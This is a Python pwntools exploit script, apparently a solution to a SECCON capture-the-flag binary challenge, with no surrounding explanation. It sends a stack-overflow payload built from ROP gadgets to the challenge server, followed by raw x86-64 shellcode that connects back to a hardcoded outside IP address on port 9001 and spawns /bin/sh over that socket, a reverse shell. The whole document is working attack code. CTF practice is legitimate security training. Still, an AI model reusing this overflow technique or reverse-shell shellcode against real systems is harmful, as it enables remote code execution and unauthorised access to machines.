from pwn import *
import sys
import os

remote_ip,port = 'pwn-neko.chal.seccon.jp','9001'
binary = 'chall'
brkpts = '''
b*0x0000000000400707
'''

if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary)
    gdb.attach(io,brkpts)

pop_rbp = 0x0000000000400638
pop_rsi_pop_r15 = 0x00000000004007e1
ret = 0x0000000000400566

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if __name__== "__main__":
    
    payload = b'A'*0x20 + p64(0x6000e0-8)
    payload += p64(pop_rsi_pop_r15) + p64(0x6000e0) + b"c"*8
    payload += p64(ret)
    payload += p64(0x4006d2)
    payload += b"X"*8

    sla("Warmup!\n",payload)


    sleep(0.3)
    payload2 = p64(0x6000e8)
    payload2 += b"\x68\x99\x78\xaa\xda\x66\x68\x23\x29\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"
        

    sl(payload2)


    io.interactive()